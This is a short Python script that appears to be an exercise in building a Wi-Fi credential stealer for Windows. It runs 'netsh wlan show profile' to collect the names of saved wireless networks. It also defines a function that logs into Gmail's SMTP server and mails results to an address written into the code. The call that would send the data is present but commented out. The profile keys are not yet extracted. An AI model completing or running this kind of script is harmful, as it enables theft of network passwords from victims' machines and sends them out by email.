#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()



command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# re.search is good but with the re.findall we have all the results in a list
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
# print(network_names.group(1))
print(network_names)

# send_mail("gizmapps@gmail.com", "@", result)
